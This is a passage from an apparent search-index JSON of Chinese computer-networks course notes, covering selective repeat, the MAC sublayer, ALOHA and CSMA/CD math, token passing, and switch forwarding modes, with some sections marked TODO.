\u7684\u5927\u5c0f\u4e0d\u5e94\u8be5\u8d85\u8fc7\u5e27\u7f16\u53f7\u7684\u603b\u4e2a\u6570\uff0c\u5426\u5219\u63a5\u6536\u65b9\u6709\u53ef\u80fd\u65e0\u6cd5\u5206\u8fa8\u65b0\u65e7\u6570\u636e\u5e27\u3002\u4f8b\u5982\u5982\u679c\u91c7\u7528 n-bit \u5e27\u7f16\u53f7\uff0c\u5219\u53d1\u9001\u7a97\u53e3\u5927\u5c0f\u5e94\u8be5\u6ee1\u8db3 \\(1\\le W_T \\le 2^n-1\\)\u3002</p> <p>\u9009\u62e9\u91cd\u4f20\u534f\u8bae SR</p> <p>\u9009\u62e9\u91cd\u4f20\u534f\u8bae\u8fdb\u4e00\u6b65\u5141\u8bb8\u63a5\u6536\u65b9\u4e71\u5e8f\u63a5\u6536\u5e27\uff0c\u6b64\u65f6\u63a5\u6536\u65b9\u53ef\u4ee5\u5148\u786e\u8ba4\u5931\u5e8f\u4f46\u6b63\u786e\u5230\u8fbe\u5e76\u4e14\u5e8f\u53f7\u4ecd\u5728\u63a5\u6536\u7a97\u53e3\u7684\u6570\u636e\u5e27\uff0c\u4f46\u6b64\u65f6\u5e76\u4e0d\u9012\u4ea4\u7ed9\u7f51\u7edc\u5c42\u3002\u7b49\u5230\u7f3a\u5931\u7684\u6570\u636e\u5e27\u5230\u8fbe\u540e\uff0c\u518d\u5c06\u5176\u53ca\u4e4b\u540e\u5df2\u786e\u8ba4\u7684\u5e27\u4e00\u5e76\u9001\u4ea4\u3002</p> <p>\u4e3a\u4e86\u4f7f\u53d1\u9001\u65b9\u4ec5\u91cd\u4f20\u51fa\u9519\u7684\u5e27\uff0c\u63a5\u6536\u65b9\u4e0d\u80fd\u518d\u91c7\u7528\u7d2f\u79ef\u786e\u8ba4\uff0c\u53ea\u80fd\u5bf9\u6bcf\u4e2a\u6570\u636e\u5e27\u9010\u4e00\u786e\u8ba4\u3002\u63a5\u6536\u65b9\u8fd8\u9700\u8981\u8bbe\u7f6e\u5927\u5c0f\u4e0e\u63a5\u6536\u7a97\u53e3\u5927\u5c0f\u76f8\u5f53\u7684\u5e27\u7f13\u51b2\u533a\uff0c\u4ee5\u6682\u5b58\u90a3\u4e9b\u5931\u5e8f\u7684\u6570\u636e\u5e27\u3002</p> <p></p> <p>SR \u534f\u8bae\u8fd8\u8bbe\u7f6e\u4e86\u4e00\u4e2a\u66f4\u6709\u6548\u7684\u91cd\u4f20\u7b56\u7565\uff0c\u5f53\u63a5\u6536\u65b9\u68c0\u6d4b\u5230\u67d0\u4e2a\u6570\u636e\u5e27\u51fa\u9519\uff0c\u5c31\u7acb\u5373\u5411\u53d1\u9001\u65b9\u53d1\u9001\u4e00\u4e2a\u5426\u5b9a\u5e27 NAK\uff0c\u8981\u6c42\u53d1\u9001\u65b9\u7acb\u5373\u91cd\u4f20\u6307\u5b9a\u7684\u6570\u636e\u5e27\uff0c\u800c\u4e0d\u7528\u7b49\u8d85\u65f6\u3002\uff08\u6ce8\u610f\u4e0a\u56fe\u7684 10 \u53f7\u5e27\u7684\u5904\u7406\uff09</p> <p>\u5bf9\u4e8e n-bit \u5e27\u7f16\u53f7\uff0c\u6211\u4eec\u8981\u6c42\u4ee5\u4e0b\u4e24\u70b9\uff1a</p> <ul> <li>\\(W_R + W_T \\le 2^n\\)</li> <li>\\(W_R\\le W_T\\)<ul> <li>\u5426\u5219\u63a5\u6536\u7a97\u53e3\u6c38\u8fdc\u4e0d\u4f1a\u586b\u6ee1\uff0c\u591a\u51fa\u7684\u7a7a\u95f4\u65e0\u610f\u4e49</li> </ul> </li> </ul> <p>\u4e00\u822c\u60c5\u51b5\u4e0b\u4f1a\u8bbe\u7f6e \\(W_R=W_T\\le 2^{n-1}\\)\u3002</p>"},{"location":"Courses/CN/Topic2/#mac","title":"MAC \u5b50\u5c42","text":"<p>\u5728 OSI \u53c2\u8003\u6a21\u578b\u4e0b\uff0c\u6570\u636e\u94fe\u8def\u5c42\u5b9e\u9645\u5206\u4e3a\u4e24\u4e2a\u5b50\u5c42\uff1a</p> <ul> <li>MAC \u5b50\u5c42\uff1a\u4ecb\u8d28\u8bbf\u95ee</li> <li>LLC \u5b50\u5c42\uff1a\u627f\u4e0a\u542f\u4e0b</li> </ul> <p>\u56e0\u6b64\u672c\u8282\u8981\u8bb2\u7684\u5176\u5b9e\u662f\u4ecb\u8d28\u8bbf\u95ee\u63a7\u5236\u76f8\u5173\u7684\u95ee\u9898\u3002</p> <p>\u5982\u679c\u4ee4 \\(D_0\\) \u8868\u793a\u7f51\u7edc\u7a7a\u95f2\u65f6\u7684\u65f6\u5ef6\uff0c\\(D\\) \u8868\u793a\u7f51\u7edc\u7684\u5f53\u524d\u65f6\u5ef6\uff0c\u90a3\u4e48\u5728\u9002\u5f53\u7684\u5047\u5b9a\u6761\u4ef6\u4e0b\uff0c\u53ef\u4ee5\u7528\u5982\u4e0b\u516c\u5f0f\u8868\u793a \\(D,D_0\\) \u548c\u7f51\u7edc\u5229\u7528\u7387 \\(U\\) \u7684\u5173\u7cfb\uff1a</p> \\[ D= \\frac{D_0}{1-U} \\] <p>\u5047\u5b9a \\(D_0\\) \u662f\u4e00\u4e2a\u5fae\u5c0f\u7684\u975e\u96f6\u503c\uff0c\u6839\u636e\u51fd\u6570\u7279\u6027\uff0c\u6211\u4eec\u77e5\u9053\uff1a\u5f53\u7f51\u7edc\u5229\u7528\u7387\u8fbe\u5230 50% \u65f6\uff0c\u65f6\u5ef6\u5c31\u8981\u52a0\u500d\uff1b\u5f53\u7f51\u7edc\u5229\u7528\u7387\u8d85\u8fc7 50% \u65f6\uff0c\u65f6\u5ef6\u6025\u5267\u589e\u5927\u3002</p> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u8bbe\u8ba1\u4e00\u4e9b\u4f18\u79c0\u7684\u4ecb\u8d28\u8bbf\u95ee\u63a7\u5236\u534f\u8bae\uff0c\u4ee5\u66f4\u597d\u5730\u6ee1\u8db3\u9700\u6c42\uff0c\u63d0\u9ad8\u4fe1\u9053\u5229\u7528\u7387\u3002</p> <p>\u4e09\u5927\u7c7b\u591a\u8def\u8bbf\u95ee\u534f\u8bae</p> <p></p>"},{"location":"Courses/CN/Topic2/#_9","title":"\u968f\u673a\u8bbf\u95ee\u534f\u8bae","text":"<p>ALOHA \u534f\u8bae</p> <p>\u7eaf ALOHA \u534f\u8bae\u7684\u57fa\u672c\u601d\u60f3\u662f\uff0c\u5f53\u603b\u7ebf\u5f62\u7f51\u7edc\u4e2d\u7684\u4efb\u4f55\u7ad9\u70b9\u9700\u8981\u53d1\u9001\u6570\u636e\u65f6\uff0c\u53ef\u4ee5\u4e0d\u8fdb\u884c\u4efb\u4f55\u68c0\u6d4b\u5c31\u53d1\u9001\u6570\u636e\u3002\u82e5\u5728\u4e00\u6bb5\u65f6\u95f4\u5185\u672a\u6536\u5230\u786e\u8ba4\uff0c\u5219\u8ba4\u4e3a\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u53d1\u751f\u51b2\u7a81\uff0c\u6b64\u65f6\u53d1\u9001\u7ad9\u70b9\u5728\u7b49\u5f85\u968f\u673a\u65f6\u95f4\u540e\u91cd\u65b0\u53d1\u9001\u6570\u636e\uff0c\u76f4\u5230\u6210\u529f\u3002</p> \u603b\u7ebf\u5f62\u7f51\u7edc <p></p> <p>\u53ea\u8981\u4e24\u4e2a\u5e27\u5728\u76f8\u540c\u65f6\u95f4\u8bd5\u56fe\u5360\u7528\u4fe1\u9053\uff0c\u5c31\u4f1a\u53d1\u751f\u51b2\u7a81\u3002\u51b2\u7a81\u7684\u5e27\u88ab\u5b8c\u5168\u7834\u574f\uff0c\u56e0\u6b64\u63a5\u6536\u65b9\u4e0d\u4f1a\u8fd4\u56de\u786e\u8ba4\u3002</p> <p>\u7eaf ALOHA \u534f\u8bae\u4e2d\u4e00\u4e2a\u5e27\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u9047\u5230\u51b2\u7a81\u7684\u6982\u7387\u7b26\u5408\u6cca\u677e\u5206\u5e03\uff0c\u6982\u7387\u4e3a \\(P_0=e^{-2G}\\)\uff0c\u5176\u4e2d \\(G\\) \u4e3a\u5e27\u53d1\u9001\u65f6\u95f4 \\(T\\) \u5185\u6240\u6709\u901a\u4fe1\u7ad9\u603b\u5171\u53d1\u9001\u7684\u5e27\u6570\u91cf\u5e73\u5747\u503c\uff0c\u5305\u62ec\u539f\u53d1\u548c\u91cd\u53d1\u7684\u5206\u7ec4\u3002\u90a3\u4e48\uff0c\u53d1\u9001\u6210\u529f\u7684\u5206\u7ec4\u6570\u91cf \\(S\\) \u4e3a\u5df2\u53d1\u9001\u5206\u7ec4\u7684\u6570\u91cf \\(G\\) \u4e58\u4ee5 \\(P_0\\)\uff0c\u5373\uff1a</p> \\[ S=G\\times P_0 = G\\times e^{-2G} \\] <p>\u4e3a\u4e86\u5b9e\u73b0\u6700\u9ad8\u4fe1\u9053\u5229\u7528\u7387\uff0c\u6211\u4eec\u5bf9 \\(S\\) \u6c42\u5bfc\u5f97\u5230 \\(S' =e^{-2G} -2Ge^{-2G}=0\\)\uff0c\u56e0\u6b64\u5f53 \\(G=0.5\\) \u65f6 Pure ALOHA \u534f\u8bae\u53d6\u5f97\u6700\u9ad8\u4fe1\u9053\u5229\u7528\u7387\uff0c\u6b64\u65f6 \\(S=0.5\\times e^{-1}=0.184\\)\u3002</p> <p>\u6211\u4eec\u901a\u5e38\u7528 \\(S\\) \u63a5\u8fd1 1 \u7684\u7a0b\u5ea6\u6765\u8861\u91cf\u4fe1\u9053\u5229\u7528\u7387\uff0c\u5373 Pure ALOHA \u534f\u8bae\u7684\u6700\u9ad8\u4fe1\u9053\u5229\u7528\u7387\u4e3a 18.4%</p> <p>\u7eaf ALOHA \u534f\u8bae\u541e\u5410\u91cf\u5f88\u4f4e\uff0c\u56e0\u6b64\u4ea7\u751f\u4e86\u65f6\u9699 ALOHA \u534f\u8bae\uff0c\u5b83\u540c\u6b65\u4e86\u5404\u7ad9\u70b9\u7684\u65f6\u95f4\uff0c\u5c06\u65f6\u95f4\u5212\u5206\u4e3a\u4e00\u6bb5\u6bb5\u7b49\u957f\u7684\u65f6\u9699\uff0c\u65f6\u9699\u7684\u957f\u5ea6\u5927\u4e8e\u7b49\u4e8e\u4e00\u5e27\u7684\u4f20\u8f93\u65f6\u95f4\uff0c\u89c4\u5b9a\u5404\u7ad9\u70b9\u53ea\u80fd\u5728\u6bcf\u4e2a\u65f6\u9699\u5f00\u59cb\u65f6\u624d\u80fd\u53d1\u9001\u5e27\u3002</p> <p>\u56e0\u6b64\uff0c\u51b2\u7a81\u53ea\u53ef\u80fd\u53d1\u751f\u5728\u65f6\u9699\u7684\u8d77\u70b9\uff0c\u51b2\u7a81\u53d1\u751f\u65f6\u53ea\u6d6a\u8d39\u4e00\u4e2a\u65f6\u9699\uff0c\u6b64\u65f6\u51b2\u7a81\u53cc\u65b9\u90fd\u7b49\u5f85\u968f\u673a\u65f6\u95f4\u540e\u8fdb\u884c\u91cd\u4f20\u3002</p> <p>CSMA \u534f\u8bae</p> <p>CSMA \u7684\u5168\u79f0\u4e3a\u8f7d\u6ce2\u76d1\u542c\u591a\u8def\u8bbf\u95ee Carrier Sense Multiple Access\uff0c\u610f\u6307\u8ba9\u6bcf\u4e2a\u7ad9\u70b9\u5728\u53d1\u9001\u6570\u636e\u524d\u90fd\u5148\u5bf9\u516c\u7528\u4fe1\u9053\u8fdb\u884c\u76d1\u542c\uff0c\u786e\u4fdd\u4fe1\u9053\u6b64\u65f6\u7a7a\u95f2\u540e\u518d\u53d1\u9001\u3002</p> <p>\u6839\u636e\u76d1\u542c\u65b9\u5f0f\u548c\u76d1\u542c\u5230\u4fe1\u9053\u5fd9\u540e\u7684\u5904\u7406\u65b9\u5f0f\u4e0d\u540c\uff0cCSMA \u534f\u8bae\u5206\u4e3a\u4e09\u79cd\uff1a</p> \u534f\u8bae\u7c7b\u578b \u4fe1\u9053\u7a7a\u95f2\u65f6\u884c\u4e3a \u4fe1\u9053\u5fd9\u65f6\u884c\u4e3a \u7279\u70b9\u603b\u7ed3 1-\u6301\u7eed CSMA \u7acb\u5373\u53d1\u9001 \u6301\u7eed\u76d1\u542c\uff0c\u5e76\u7b49\u5f85\u7a7a\u95f2\u540e\u9a6c\u4e0a\u53d1\u9001 \u5982\u679c\u4e24\u4e2a\u4ee5\u4e0a\u7684\u7ad9\u5728\u7b49\u5f85\u53d1\u9001\uff0c\u4e00\u65e6\u4ecb\u8d28\u7a7a\u95f2\u5c31\u5fc5\u5b9a\u53d1\u751f\u51b2\u7a81 p-\u6301\u7eed CSMA \u6982\u7387 p \u53d1\u9001\uff0c\u6982\u7387 1-p \u63a8\u8fdf\u5230\u4e0b\u4e00\u4e2a\u65f6\u9699 \u6301\u7eed\u76d1\u542c\uff0c\u76f4\u5230\u7a7a\u95f2\u518d\u6309\u6982\u7387\u51b3\u7b56\u53d1\u9001 \u53ea\u9002\u7528\u4e8e\u65f6\u5206\u4fe1\u9053 \u975e\u6301\u7eed CSMA \u7acb\u5373\u53d1\u9001 \u7b49\u5f85\u968f\u673a\u4e8b\u4ef6\uff0c\u518d\u6b21\u76d1\u542c \u51b2\u7a81\u53ef\u80fd\u6027\u8f83\u4f4e\uff0c\u4f46\u662f\u5ef6\u8fdf\u8f83\u9ad8 <p>\u4ece 1-\u6301\u7eed \u5230 \u975e\u6301\u7eed\uff0c\u8bbf\u95ee\u63a7\u5236\u9010\u6e10\u4ece\u6fc0\u8fdb\u53d8\u5f97\u4fdd\u5b88</p> <p>CSMA/CD (CSMA with Collision Detection) \u662f CSMA \u534f\u8bae\u7684\u6539\u8fdb\u65b9\u6848\uff0c\u540c\u65f6\u4e5f\u5c5e\u4e8e 1-\u6301\u7eed CSMA\uff0c\u9002\u7528\u4e8e\u603b\u7ebf\u5f62\u7f51\u7edc\u6216\u534a\u53cc\u5de5\u7f51\u7edc\u73af\u5883\u3002</p> <p>\u5176\u4e2d\u51b2\u7a81\u68c0\u6d4b\u6307\u7684\u662f\u7ad9\u70b9\u5728\u53d1\u6570\u636e\u8fc7\u7a0b\u4e2d\u4e5f\u8981\u6301\u7eed\u68c0\u6d4b\u4fe1\u9053\uff0c\u82e5\u68c0\u6d4b\u5230\u51b2\u7a81\uff0c\u5219\u7acb\u5373\u505c\u6b62\u53d1\u9001\u6570\u636e\uff0c\u5e76\u7b49\u5f85\u968f\u673a\u65f6\u95f4\u540e\u518d\u6b21\u53d1\u9001\u3002</p> <p>\u5047\u8bbe\u7aef\u5230\u7aef\u4f20\u64ad\u65f6\u5ef6\u4e3a \\(\\tau\\)\uff0c\u90a3\u4e48\u4e00\u4e2a\u7ad9\u5728\u53d1\u9001\u6570\u636e\u540e\u7ecf\u8fc7 \\(2\\tau\\) \u624d\u80fd\u786e\u5b9a\u6ca1\u6709\u53d1\u751f\u51b2\u7a81\uff0c\u56e0\u6b64\u7aef\u5230\u7aef\u5f80\u8fd4\u4f20\u64ad\u65f6\u5ef6 \\(2\\tau\\) \u79f0\u4e3a\u4e89\u7528\u671f\u3002\u4ee5\u592a\u7f51\u5728\u53d1\u9001\u6570\u636e\u65f6\uff0c\u5982\u679c\u4e89\u7528\u671f\u5185\u6ca1\u6709\u53d1\u751f\u51b2\u7a81\uff0c\u5219\u540e\u7eed\u7684\u6570\u636e\u5c31\u4e0d\u4f1a\u53d1\u751f\u51b2\u7a81\uff0c\u56e0\u6b64\u4e89\u7528\u671f\u5185\u53ef\u53d1\u9001\u7684\u6570\u636e\u957f\u5ea6\u88ab\u89c4\u5b9a\u4e3a\u6700\u77ed\u5e27\u957f\uff0c\u8ba1\u7b97\u516c\u5f0f\u4e3a\uff1a</p> \\[ \\text{\u6700\u77ed\u5e27\u957f}=\\text{\u6700\u5927\u5355\u5411\u4f20\u64ad\u65f6\u5ef6} \\times 2 \\times \\text{\u6570\u636e\u4f20\u8f93\u901f\u7387} \\] <p>\u5bf9\u4e8e 10Mbps\uff0c\u4e89\u7528\u671f\u957f\u5ea6\u4e3a 51.2\\(\\mu s\\) \u7684\u4ee5\u592a\u7f51\uff0c\u6700\u77ed\u5e27\u957f\u4e3a 64B</p> <p>\u90a3\u4e48\uff0c\u5728\u68c0\u6d4b\u5230\u51b2\u7a81\u540e\uff0c\u91cd\u53d1\u7b49\u5f85\u7684\u968f\u673a\u65f6\u95f4\u5177\u4f53\u600e\u4e48\u786e\u5b9a\uff1fCSMA/CD \u4f7f\u7528\u4e8c\u8fdb\u5236\u6307\u6570\u9000\u907f\u7b97\u6cd5\u6765\u786e\u5b9a\u51b2\u7a81\u540e\u91cd\u4f20\u7684\u65f6\u673a\uff1a</p> <ul> <li>\u786e\u5b9a\u57fa\u672c\u9000\u907f\u65f6\u95f4\uff0c\u4e00\u822c\u53d6 \\(2\\tau\\)</li> <li>\u4ece\u79bb\u6563\u96c6\u5408 \\([0,1,...,2^k-1]\\) \u4e2d\u968f\u673a\u53d6\u4e00\u4e2a\u6570\uff0c\u8bb0\u4e3a \\(r\\)\uff0c\u91cd\u4f20\u63a8\u8fdf\u65f6\u95f4\u5373\u4e3a \\(2\\tau \\times r\\)<ul> <li>\u5176\u4e2d\u53c2\u6570 \\(k\\) \u53d6 \\(\\min [\\text{\u91cd\u4f20\u6b21\u6570},10]\\)\uff0c\u5373\u5f53\u91cd\u4f20\u6b21\u6570\u8d85\u8fc7 10 \u540e\uff0c\\(k\\) \u5c31\u4e00\u76f4\u53d6 10</li> </ul> </li> <li>\u5f53\u91cd\u4f20 16 \u6b21\u4ecd\u4e0d\u6210\u529f\uff0c\u5219\u8ba4\u4e3a\u8be5\u5e27\u6c38\u8fdc\u4e0d\u4f1a\u6b63\u786e\u53d1\u51fa\uff0c\u629b\u5f03\u8be5\u5e27\u5e76\u5411\u4e0a\u5c42\u62a5\u544a\u51fa\u9519</li> </ul> <p>\u4ee5\u592a\u7f51\u5c31\u91c7\u7528\u4e86 CSMA/CD \u534f\u8bae\uff1a</p> <ul> <li>\u541e\u5410\u91cf: \u6bd4 ALOHA \u9ad8\uff0c\u6bd4 p-\u6301\u7eed CSMA \u4f4e</li> <li>\u51b2\u7a81\u7387: \u6bd4 ALOHA \u5c11\uff0c\u6bd4 p-\u6301\u7eed CSMA \u9ad8</li> </ul>"},{"location":"Courses/CN/Topic2/#_10","title":"\u53d7\u63a7\u8bbf\u95ee\u534f\u8bae","text":"<p>\u4f4d\u56fe\u534f\u8bae / \u9884\u7559\u534f\u8bae</p> <p>TODO</p> <p>\u4ee4\u724c\u4f20\u9012\u534f\u8bae</p> <p>\u4ee4\u724c\u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u63a7\u5236\u5e27\uff0c\u4ec5\u7528\u4f5c\u63a7\u5236\u4fe1\u9053\u4f7f\u7528\uff0c\u5b83\u4f1a\u6cbf\u7740\u73af\u5f62\u603b\u7ebf\u5728\u5404\u7ad9\u4e4b\u95f4\u4f9d\u6b21\u4f20\u9012\u3002</p> <p>\u5f53\u73af\u4e0a\u7684\u4e00\u4e2a\u7ad9\u5e0c\u671b\u53d1\u9001\u5e27\u65f6\uff0c\u5fc5\u987b\u7b49\u5f85\u4ee4\u724c\u3002\u7ad9\u70b9\u53ea\u6709\u53d6\u5f97\u4ee4\u724c\u540e\u624d\u80fd\u53d1\u9001\u5e27\uff0c\u56e0\u4e3a\u4ee4\u724c\u53ea\u6709\u4e00\u4e2a\uff0c\u6240\u6709\u4fe1\u9053\u4e0a\u4e0d\u4f1a\u53d1\u9001\u51b2\u7a81\u3002\u7ad9\u70b9\u53d1\u9001\u5b8c\u4e00\u5e27\u540e\uff0c\u5e94\u91ca\u653e\u4ee4\u724c\uff0c\u4ee5\u4fbf\u8ba9\u5176\u4ed6\u7ad9\u4f7f\u7528\u3002</p> <ol> <li>\u5f53\u7f51\u7edc\u7a7a\u95f2\u65f6\uff0c\u73af\u8def\u4e2d\u53ea\u6709\u4ee4\u724c\u5e27\u5728\u5faa\u73af\u4f20\u9012\u3002</li> <li>\u5f53\u4ee4\u724c\u4f20\u9012\u5230\u6709\u6570\u636e\u8981\u53d1\u9001\u7684\u7ad9\u70b9\u65f6\uff0c\u8be5\u7ad9\u70b9\u5c31\u4fee\u6539\u4ee4\u724c\u4e2d\u7684\u4e00\u4e2a\u6807\u5fd7\u4f4d\uff0c\u5e76\u5728\u4ee4\u724c\u4e2d\u9644\u52a0\u81ea\u5df1\u9700\u8981\u4f20\u8f93\u7684\u6570\u636e\uff0c\u5c06\u4ee4\u724c\u53d8\u6210\u4e00\u4e2a\u6570\u636e\u5e27\uff0c\u7136\u540e\u5c06\u8fd9\u4e2a\u6570\u636e\u5e27\u53d1\u9001\u51fa\u53bb\u3002</li> <li>\u6570\u636e\u5e27\u6cbf\u7740\u73af\u8def\u4f20\u8f93\uff0c\u63a5\u6536\u5230\u7684\u7ad9\u70b9\u4e00\u8fb9\u8f6c\u53d1\u6570\u636e\uff0c\u4e00\u8fb9\u67e5\u770b\u5e27\u7684\u76ee\u7684\u5730\u5740\u3002\u82e5\u76ee\u7684\u5730\u5740\u548c\u81ea\u5df1\u7684\u5730\u5740\u76f8\u540c\uff0c\u5219\u63a5\u6536\u7ad9\u5c31\u590d\u5236\u8be5\u6570\u636e\u5e27\uff0c\u4ee5\u4fbf\u8fdb\u4e00\u6b65\u5904\u7406\u3002</li> <li>\u6570\u636e\u5e27\u6cbf\u7740\u73af\u8def\u4f20\u8f93\uff0c\u76f4\u5230\u5230\u8fbe\u8be5\u5e27\u7684\u6e90\u7ad9\u70b9\uff0c\u6e90\u7ad9\u70b9\u6536\u5230\u81ea\u5df1\u53d1\u51fa\u53bb\u7684\u5e27\u540e\u4fbf\u4e0d\u518d\u8f6c\u53d1\u3002\u540c\u65f6\uff0c\u901a\u8fc7\u68c0\u9a8c\u8fd4\u56de\u7684\u5e27\u6765\u67e5\u770b\u6570\u636e\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u662f\u5426\u51fa\u9519\uff0c\u82e5\u51fa\u9519\uff0c\u5219\u91cd\u4f20\u3002</li> <li>\u6e90\u7ad9\u70b9\u4f20\u9001\u5b8c\u6570\u636e\u540e\uff0c\u91cd\u65b0\u4ea7\u751f\u4e00\u4e2a\u4ee4\u724c\uff0c\u5e76\u4f20\u9012\u7ed9\u4e0b\u4e00\u7ad9\u70b9\uff0c\u4ea4\u51fa\u4fe1\u9053\u63a7\u5236\u6743\u3002</li> </ol> <p>\u4e8c\u8fdb\u5236\u5012\u8ba1\u6570\u534f\u8bae</p> <p>TODO</p>"},{"location":"Courses/CN/Topic2/#_11","title":"\u6709\u9650\u7ade\u4e89\u534f\u8bae\uff1a\u81ea\u9002\u5e94\u6811","text":"<p>TODO</p>"},{"location":"Courses/CN/Topic2/#_12","title":"\u6570\u636e\u94fe\u8def\u5c42\u8bbe\u5907","text":"<p>\u96c6\u7ebf\u5668\u662f\u7269\u7406\u5c42\u6269\u5145\u7f51\u7edc\u7684\u8bbe\u5907\uff0c\u800c\u7f51\u6865\uff08\u6216\u53eb\u4ee5\u592a\u7f51\u4ea4\u6362\u673a\uff09\u662f\u6570\u636e\u94fe\u8def\u5c42\u6269\u5145\u7f51\u7edc\u7684\u8bbe\u5907\uff0c\u5b83\u5c06\u51e0\u4e2a\u4e0d\u540c\u7684\u51b2\u7a81\u57df\u8fde\u63a5\u5728\u4e00\u8d77\uff0c\u5e76\u5b9e\u73b0\u4e86\u4ea4\u6362\u8f6c\u53d1\u7684\u529f\u80fd\uff0c\u5b83\u7684\u63a5\u53e3\u5de5\u4f5c\u5728\u5168\u53cc\u5de5\u65b9\u5f0f\u3002</p> <p>\u51b2\u7a81\u57df\u548c\u5e7f\u64ad\u57df\u7684\u533a\u522b</p> <p>\u5e7f\u64ad\u57df\u662f\u5e7f\u64ad\u5e27\u80fd\u591f\u5230\u8fbe\u7684\u8303\u56f4\uff1b\u800c\u51b2\u7a81\u57df\u662f\u540c\u4e00\u65f6\u95f4\u5185\u53ea\u80fd\u6709\u4e00\u53f0\u8bbe\u5907\u53d1\u9001\u4fe1\u606f\u7684\u8303\u56f4\u3002</p> <p>\u5e7f\u64ad\u57df\u8303\u56f4\u901a\u5e38\u5927\u4e8e\u51b2\u7a81\u57df\u3002</p> <p>\u4e3a\u4e86\u5b9e\u73b0\u4ea4\u6362\u529f\u80fd\uff0c\u7f51\u6865\u53ef\u4ee5\u81ea\u5b66\u4e60\u6784\u5efa MAC \u5730\u5740\u8868\u3002\u4efb\u610f\u4e00\u4e2a\u7ad9\u53d1\u9001\u5e27\u65f6\uff0c\u7f51\u6865\u4e5f\u4f1a\u6536\u5230\u4e00\u4efd\u76f8\u540c\u7684\u5e27\uff0c\u6b64\u65f6\u53d1\u9001\u7ad9\u7684 MAC \u5730\u5740\u5c31\u4f1a\u88ab\u5b66\u4e60\u3002</p> <p>\u4e00\u822c\u8bbe\u7f6e\u81ea\u5b66\u4e60\u5f97\u5230\u7684\u52a8\u6001\u8868\u9879\u8001\u5316\u65f6\u95f4\u4e3a 300s\uff0c\u5f53\u8001\u5316\u65f6\u95f4\u5230\u671f\u65f6\uff0c\u8be5\u8868\u9879\u4f1a\u88ab\u6e05\u9664\uff1b\u4e0d\u8fc7\u6211\u4eec\u4e5f\u53ef\u4ee5\u624b\u52a8\u6dfb\u52a0\u9759\u6001 MAC \u5730\u5740\u8868\u9879\uff0c\u5b83\u4e0d\u4f1a\u8001\u5316\uff0c\u4e14\u4f18\u5148\u7ea7\u9ad8\u4e8e\u52a8\u6001\u8868\u9879\u3002</p> <p>\u7f51\u6865\u5bf9\u4e8e\u6536\u5230\u7684\u5165\u5883\u5e27\u6709\u4e09\u79cd\u5904\u7406\uff1a</p> <ul> <li>forwarding: \u8f6c\u53d1\uff0c\u5728 MAC \u5730\u5740\u8868\u5b8c\u5584\u65f6\u6839\u636e\u8868\u9879\u9009\u62e9\u8f6c\u53d1\u5230\u54ea\u4e2a\u7aef\u53e3</li> <li>filtering: \u8fc7\u6ee4\uff0c\u5982\u679c\u5165\u5883\u53e3\u7b49\u4e8e\u51fa\u5883\u53e3\uff0c\u8bf4\u660e\u8be5\u5e27\u6ca1\u6709\u8de8\u51b2\u7a81\u57df\uff0c\u4e22\u5f03\u8be5\u5e27</li> <li>flooding: \u6cdb\u6d2a\uff0c\u7c7b\u4f3c\u5e7f\u64ad\uff0c\u5728\u627e\u4e0d\u5230\u5339\u914d\u8868\u9879\u65f6\uff0c\u5c06\u8be5\u5165\u5883\u5e27\u5411\u6240\u6709\u7aef\u53e3\u8f6c\u53d1\uff08\u9664\u4e86\u5165\u5883\u53e3\uff09<ul> <li>\u4e00\u4e2a\u7f51\u6bb5\u7684\u6570\u636e\u88ab\u53d1\u9001\u5230\u65e0\u5173\u7f51\u6bb5\uff0c\u5b58\u5728\u5b89\u5168\u9690\u60a3\uff1b\u6d6a\u8d39\u7f51\u7edc\u8d44\u6e90</li> </ul> </li> </ul> <p>\u4ece\u4ea4\u6362\u65b9\u5f0f\uff08\u5e26\u5bbd\uff09\u89d2\u5ea6\u6765\u770b\uff0c\u53ef\u5206\u4e3a\u5bf9\u79f0\u4ea4\u6362\u548c\u975e\u5bf9\u79f0\u4ea4\u6362\uff1a</p> <ul> <li>\u5bf9\u79f0\u4ea4\u6362\uff1a\u51fa\u5165\u5e26\u5bbd\u76f8\u540c</li> <li>\u975e\u5bf9\u79f0\u4ea4\u6362\uff1a\u51fa\u5165\u5e26\u5bbd\u4e0d\u76f8\u540c</li> </ul> <p>\u800c\u4ece\u4ea4\u6362\u6a21\u5f0f\uff08\u8f6c\u53d1\u65f6\u673a\uff09\u89d2\u5ea6\u6765\u770b\uff0c\u53ef\u5206\u4e3a\u4ee5\u4e0b\u4e09\u79cd\u6a21\u5f0f\uff1a</p> <ul> <li>\u5b58\u50a8\u8f6c\u53d1\u6a21\u5f0f\uff0cStore and Forward: \u8f6c\u53d1\u524d\u5fc5\u987b\u63a5\u6536\u6574\u4e2a\u5e27\uff0c\u5e76\u6267\u884c CRC \u6821\u9a8c<ul> <li>\u4f18\u70b9\u662f\u4e0d\u8f6c\u53d1\u51fa\u9519\u5e27\u3001\u652f\u6301\u975e\u5bf9\u79f0\u4ea4\u6362</li> <li>\u7f3a\u70b9\u662f\u5ef6\u8fdf\u5927</li> </ul> </li> <li>\u76f4\u901a\u6a21\u5f0f\uff0cCut-through: \u4e00\u65e6\u63a5\u6536\u5230\u5e27\u7684\u76ee\u7684\u5730\u5740\uff0c\u5c31\u5f00\u59cb\u8f6c\u53d1<ul> <li>\u4f18\u70b9\u662f\u5ef6\u8fdf\u975e\u5e38\u5c0f</li> <li>\u7f3a\u70b9\u662f\u53ef\u80fd\u8f6c\u53d1\u9519\u8bef\u5e27\u3001\u4e0d\u652f\u6301\u975e\u5bf9\u79f0\u4ea4\u6362</li> </ul> </li> <li>\u65e0\u788e\u7247\u6a21\u5f0f\uff0cFragment-free: \u63a5\u6536\u5230\u5e27\u7684\u524d 64 \u5b57\u8282\u540e\uff0c\u624d\u5f00\u59cb\u8f6c\u53d1<ul> <li>\u4f18\u70b9\u662f\u8fc7\u6ee4\u4e86\u51b2\u7a81\u788e\u7247\uff0c\u5ef6\u8fdf\u548c\u8f6c\u53d1\u9519\u5e27\u4ecb\u4e8e\u5b58\u50a8\u8f6c\u53d1\u548c\u76f4\u901a\u4ea4\u6362\u4e4b\u95f4</li> <li>\u7f3a\u70b9\u662f\u4ecd\u53ef\u80fd\u8f6c\u53d1\u9519\u8bef\u5e27\u3001\u4e0d\u652f\u6301\u975e\u5bf9\u79f0\u4ea4\u6362</li> </ul> </li> </ul> 